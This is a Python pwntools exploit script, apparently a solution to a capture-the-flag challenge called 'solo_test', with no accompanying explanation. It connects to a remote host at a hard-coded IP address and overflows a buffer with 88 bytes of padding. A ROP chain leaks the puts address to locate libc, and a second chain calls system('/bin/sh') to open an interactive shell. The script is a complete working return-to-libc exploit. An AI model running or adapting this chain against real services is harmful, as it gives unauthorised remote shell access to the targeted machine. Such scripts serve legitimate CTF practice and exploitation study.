from pwn import *

elf = context.binary = ELF("./solo_test")
#r = process(elf.path)
r = remote("115.68.235.72", 1337)

r.recvuntil(">>")
r.sendline("Me")
r.recvuntil(">>")
r.sendline("No")
r.recvuntil(">>")
r.sendline("CTF")
r.recvuntil(">>")
r.sendline("Never")
r.recvuntil(">>")
r.sendline("No")

elf_rop = ROP(elf)
elf_rop.puts(elf.got["puts"])
elf_rop.call(elf.symbols["solo"])

payload = ""
payload += "A" * 88
payload += str(elf_rop)
r.sendlineafter("--> ", payload)

puts_leak = u64(r.recvline().rstrip().ljust(8, "\x00"))
log.info("puts leak: {}".format(hex(puts_leak)))

libc = ELF("./libc.so.6")
libc.address = puts_leak - libc.symbols["puts"]

libc_rop = ROP(libc)
libc_rop.raw(elf_rop.find_gadget(["ret"]))
libc_rop.system(next(libc.search("/bin/sh\x00")))

payload = ""
payload += "A" * 88
payload += str(libc_rop)
r.sendlineafter("--> ", payload)

r.interactive()

